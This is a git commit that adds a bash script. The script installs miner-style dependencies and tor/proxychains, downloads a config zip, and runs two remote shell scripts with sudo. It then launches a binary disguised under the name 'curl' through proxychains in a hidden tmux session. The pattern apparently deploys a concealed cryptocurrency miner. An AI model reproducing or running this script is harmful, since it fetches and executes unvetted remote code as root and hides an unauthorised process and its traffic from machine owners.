67826fef6564602552ede7b8445f5a8c18e59a45
wowonero <82920886+wowonero@users.noreply.github.com>
2021-04-21 09:56:35 +0700

    Create script.sh

---
+++ script.sh
@@ -0,0 +1,28 @@
+#!/bin/bash
+
+set -x #echo on
+if [ -f ${PWD}/curl ]; then
+    if pgrep -x "curl" > /dev/null
+then
+    echo "scrip dang chay roi , ke cmn di "
+    
+else
+
+echo "script da install , chay thoi "
+sudo proxychains tmux new-session -d -s my_session1 './curl'
+
+fi
+exit
+fi
+
+
+
+sudo apt install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev tor proxychains -y
+sudo wget https://github.com/wowonero/wowo/raw/main/myconfig.zip
+wget https://raw.githubusercontent.com/average140421/test/main/1gb.sh
+sudo bash 1gb.sh
+wget https://raw.githubusercontent.com/average140421/test/main/rdom.sh
+sudo bash rdom.sh
+sudo unzip myconfig.zip
+sudo chmod +x curl
+sudo proxychains tmux new-session -d -s my_session1  './curl'
